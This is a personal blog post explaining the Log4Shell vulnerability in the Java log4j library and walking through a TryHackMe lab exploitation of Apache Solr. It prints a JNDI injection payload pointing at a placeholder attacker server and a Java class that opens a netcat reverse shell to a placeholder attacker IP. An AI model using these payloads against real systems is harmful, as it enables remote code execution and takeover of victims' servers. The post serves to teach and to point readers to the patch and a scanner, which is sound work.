+++
title = "Log4shell"
date = "2022-01-14T17:25:22+05:30"
author = "Somesh Banerjee"
authorTwitter = "banerjee_somesh"
cover = ""
tags = ["InfoSec", "CVE"]
keywords = ["log4shell", "CVE-2021-44228", "log4j"]
description = ""
showFullContent = false
readingTime = true
+++

# Introduction

Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don't need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
```
logging.ERROR("error");
logging.WARN("warning");
```

Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this

![](/blogs/log4j/1.jpg)

Now that username is the actual format used for RCE using log4j. The exploit is:
```
${jndi:ldap://ATTACKER-SERVER/x}
```
The exploit can be broken into:
1. log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.
2. The first ATTACKER-SERVER then points to another attacker controlled server which is hosting a malicious Java code.
3. The victim requests the malicious code and executes it, leading to RCE.

The process can be visualized with the following figure by [GovCERT](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
![](/blogs/log4j/2.png)

The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list [here](https://github.com/YfryTchsGD/Log4jAttackSurface)

# Proof of Concept

We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.

For ldap reference server, we will use [marshalsec](https://github.com/mbechler/marshalsec). It will serve on port 1389 and point to port 8000. Here is the screenshot
![](/blogs/log4j/3.png)

Now in port 8000, the compiled class of the following java code is served.
{{< highlight java >}}
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
{{< /highlight >}}
The code just sends a reverse shell to the attacker.

Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.

![](/blogs/log4j/4.gif)

# Conclusion

The CVE have been patched in log4j update by disabling jndi by default. [HuntresLabs scanner](https://log4shell.huntress.com/) can be used to check for Log4Shell vulnerability in your app.

Some of the resources I used to learn about this:
- https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
- https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
- TryHackMe - Solar, exploiting log4j Room
